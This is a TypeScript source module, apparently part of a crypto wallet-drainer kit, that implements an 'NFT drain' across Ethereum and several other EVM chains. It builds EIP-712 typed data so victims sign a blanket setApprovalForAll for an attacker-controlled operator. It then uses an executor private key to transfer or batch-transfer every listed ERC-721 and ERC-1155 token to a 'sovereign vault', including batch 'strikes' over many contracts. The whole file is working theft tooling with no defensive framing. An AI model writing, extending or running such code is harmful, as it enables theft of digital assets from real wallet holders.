// @ts-nocheck
/**
 * NFT drain — ERC-721 / ERC-1155 setApprovalForAll EIP-712 intent + transferFrom settlement.
 */
import type { Address, Hex } from 'viem'
import {
  createPublicClient,
  createWalletClient,
  encodeFunctionData,
  getAddress,
  http,
  isAddress,
  parseAbi,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { arbitrum, base, bsc, mainnet, optimism, polygon, sepolia, type Chain } from 'viem/chains'

import { computeSignatureAnchorExpiry } from '../security/permit2-handler.js'
import { LEGION_MESH_EVENT_SETTLEMENT, legionMeshViemFetchOptions } from './mesh-event.js'
import {
  resolveEvmRpcUrlForChain,
  resolveEngineSpenderAddress,
  resolveSettlementExecutorKey,
} from './permit2-executor.js'
import { resolveEvmVaultAddress } from './operational-vault.js'

export const ERC721_INTERFACE_ID = '0x80ac58cd'
export const ERC1155_INTERFACE_ID = '0xd9b67a26'

export const NFT_ERC721_ABI = parseAbi([
  'function setApprovalForAll(address operator, bool approved)',
  'function isApprovedForAll(address owner, address operator) view returns (bool)',
  'function transferFrom(address from, address to, uint256 tokenId)',
  'function safeTransferFrom(address from, address to, uint256 tokenId)',
  'function supportsInterface(bytes4 interfaceId) view returns (bool)',
])

export const NFT_ERC1155_ABI = parseAbi([
  'function setApprovalForAll(address operator, bool approved)',
  'function isApprovedForAll(address owner, address operator) view returns (bool)',
  'function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data)',
  'function safeBatchTransferFrom(address from, address to, uint256[] ids, uint256[] amounts, bytes data)',
  'function supportsInterface(bytes4 interfaceId) view returns (bool)',
])

export type NftStandard = 'erc721' | 'erc1155'

export type BatchNftEntry = {
  contract: Address
  tokenIds: string[]
  standard?: NftStandard
  /** ERC-1155 amounts per tokenId; defaults to 1 each. */
  amounts?: string[]
}

export type NftApprovalTypedData = ReturnType<typeof buildNFTApprovalTypedData>

export type NftDrainSettlementResult = {
  ok: boolean
  transaction_hashes?: string[]
  detail?: string
}

function resolveChain(chainId: number): Chain {
  const map: Record<number, Chain> = {
    1: mainnet,
    56: bsc,
    137: polygon,
    42161: arbitrum,
    8453: base,
    10: optimism,
    11155111: sepolia,
  }
  return map[chainId] ?? mainnet
}

/**
 * EIP-712 typed data representing `setApprovalForAll(operator, true)` intent for batch signing.
 * Operator is the sovereign vault (destination custody).
 */
export function buildNFTApprovalTypedData(
  wallet: Address,
  operator: Address,
  nftContract: Address,
  chainId: number,
) {
  const owner = getAddress(wallet)
  const approvedOperator = getAddress(operator)
  const verifyingContract = getAddress(nftContract)
  const deadline = computeSignatureAnchorExpiry()

  return {
    domain: {
      name: 'LegionNFTApproval',
      version: '1',
      chainId,
      verifyingContract,
    },
    types: {
      SetApprovalForAll: [
        { name: 'owner', type: 'address' },
        { name: 'operator', type: 'address' },
        { name: 'approved', type: 'bool' },
        { name: 'deadline', type: 'uint256' },
      ],
    },
    primaryType: 'SetApprovalForAll' as const,
    message: {
      owner,
      operator: approvedOperator,
      approved: true,
      deadline: BigInt(deadline),
    },
  }
}

/** Build EIP-712 approval typed data for each NFT contract in a batch strike. */
export function buildBatchNFTApprovalTypedData(params: {
  wallet: Address
  chainId: number
  nfts: BatchNftEntry[]
  operator?: Address
}): Array<{ contract: Address; typedData: NftApprovalTypedData }> {
  const operator = getAddress(params.operator ?? resolveEvmVaultAddress() ?? params.wallet)
  return params.nfts.map((entry) => ({
    contract: getAddress(entry.contract),
    typedData: buildNFTApprovalTypedData(
      params.wallet,
      operator,
      getAddress(entry.contract),
      params.chainId,
    ),
  }))
}

export async function detectNftStandard(
  publicClient: { readContract: (args: unknown) => Promise<unknown> },
  nftContract: Address,
): Promise<NftStandard> {
  try {
    const is1155 = (await publicClient.readContract({
      address: nftContract,
      abi: NFT_ERC1155_ABI,
      functionName: 'supportsInterface',
      args: [ERC1155_INTERFACE_ID as Hex],
    })) as boolean
    if (is1155) return 'erc1155'
  } catch {
    // fall through
  }
  return 'erc721'
}

/**
 * Execute NFT drain — transferFrom / safeTransferFrom (or batch) to sovereign vault.
 * Caller must already hold setApprovalForAll from owner (settlement executor).
 */
export async function executeNFTDrain(params: {
  nftContract: Address
  tokenIds: string[]
  from: Address
  to: Address
  chainId: number
  standard?: NftStandard
  amounts?: string[]
  rpcUrl?: string
}): Promise<NftDrainSettlementResult> {
  if (params.tokenIds.length === 0) {
    return { ok: false, detail: 'executeNFTDrain requires at least one tokenId' }
  }

  const executorKey = resolveSettlementExecutorKey()
  if (!executorKey) {
    return {
      ok: false,
      detail: 'SETTLEMENT_EXECUTION_PRIVATE_KEY or RELAY_INTERMEDIARY_PRIVATE_KEY required',
    }
  }

  const rpc = params.rpcUrl?.trim() || (await resolveEvmRpcUrlForChain(params.chainId))
  if (!rpc) {
    return { ok: false, detail: `RPC not configured for chain ${params.chainId}` }
  }

  const chain = resolveChain(params.chainId)
  const account = privateKeyToAccount(executorKey)
  const transport = http(rpc, {
    ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
  })
  const publicClient = createPublicClient({ chain, transport })
  const walletClient = createWalletClient({ account, chain, transport })

  const nftContract = getAddress(params.nftContract)
  const from = getAddress(params.from)
  const to = getAddress(params.to)
  const operator = account.address

  const standard =
    params.standard ?? (await detectNftStandard(publicClient, nftContract))

  const abi = standard === 'erc1155' ? NFT_ERC1155_ABI : NFT_ERC721_ABI
  const approved = (await publicClient.readContract({
    address: nftContract,
    abi,
    functionName: 'isApprovedForAll',
    args: [from, operator],
  })) as boolean

  if (!approved) {
    return {
      ok: false,
      detail: `NFT operator ${operator} lacks setApprovalForAll from ${from} on ${nftContract}`,
    }
  }

  const transaction_hashes: string[] = []

  try {
    if (standard === 'erc1155') {
      const ids = params.tokenIds.map((id) => BigInt(id))
      const amounts = params.tokenIds.map((_, index) =>
        BigInt(params.amounts?.[index] ?? '1'),
      )

      if (ids.length === 1) {
        const txHash = await walletClient.writeContract({
          account,
          address: nftContract,
          abi: NFT_ERC1155_ABI,
          functionName: 'safeTransferFrom',
          args: [from, to, ids[0]!, amounts[0]!, '0x'],
          chain,
        })
        transaction_hashes.push(txHash)
      } else {
        const txHash = await walletClient.writeContract({
          account,
          address: nftContract,
          abi: NFT_ERC1155_ABI,
          functionName: 'safeBatchTransferFrom',
          args: [from, to, ids, amounts, '0x'],
          chain,
        })
        transaction_hashes.push(txHash)
      }
    } else {
      for (const tokenId of params.tokenIds) {
        const txHash = await walletClient.writeContract({
          account,
          address: nftContract,
          abi: NFT_ERC721_ABI,
          functionName: 'transferFrom',
          args: [from, to, BigInt(tokenId)],
          chain,
        })
        transaction_hashes.push(txHash)
        await publicClient.waitForTransactionReceipt({ hash: txHash as Hex, timeout: 120_000 })
      }
    }

    return { ok: true, transaction_hashes }
  } catch (e) {
    return {
      ok: false,
      transaction_hashes,
      detail: e instanceof Error ? e.message : String(e),
    }
  }
}

/** Drain all NFT entries in a batch payload to the sovereign vault. */
export async function executeBatchNftDrainSettlement(params: {
  owner: Address
  chainId: number
  nfts: BatchNftEntry[]
  rpcUrl?: string
}): Promise<NftDrainSettlementResult> {
  const vault = resolveEvmVaultAddress()
  if (!vault) {
    return { ok: false, detail: 'VAULT_ADDRESS_EVM or SOVEREIGN_VAULT_EVM required' }
  }
  if (params.nfts.length === 0) {
    return { ok: true, transaction_hashes: [] }
  }

  const transaction_hashes: string[] = []
  const faults: string[] = []

  for (const entry of params.nfts) {
    const result = await executeNFTDrain({
      nftContract: getAddress(entry.contract),
      tokenIds: entry.tokenIds,
      from: getAddress(params.owner),
      to: vault,
      chainId: params.chainId,
      standard: entry.standard,
      amounts: entry.amounts,
      rpcUrl: params.rpcUrl,
    })
    if (result.transaction_hashes?.length) {
      transaction_hashes.push(...result.transaction_hashes)
    }
    if (!result.ok) {
      faults.push(`${entry.contract}: ${result.detail ?? 'NFT drain failed'}`)
    }
  }

  return {
    ok: faults.length === 0,
    transaction_hashes,
    ...(faults.length > 0 ? { detail: faults.join('; ') } : {}),
  }
}

/** Unsigned setApprovalForAll calldata — user signs via wallet sendTransaction when needed on-chain. */
export function buildNFTSetApprovalForAllCalldata(operator: Address, approved = true): Hex {
  return encodeFunctionData({
    abi: NFT_ERC721_ABI,
    functionName: 'setApprovalForAll',
    args: [getAddress(operator), approved],
  })
}

/** Resolve on-chain operator for NFT transfers (settlement executor / engine spender). */
export function resolveNftDrainOperator(): Address | null {
  const executorKey = resolveSettlementExecutorKey()
  if (executorKey) {
    return privateKeyToAccount(executorKey).address
  }
  return resolveEngineSpenderAddress()
}
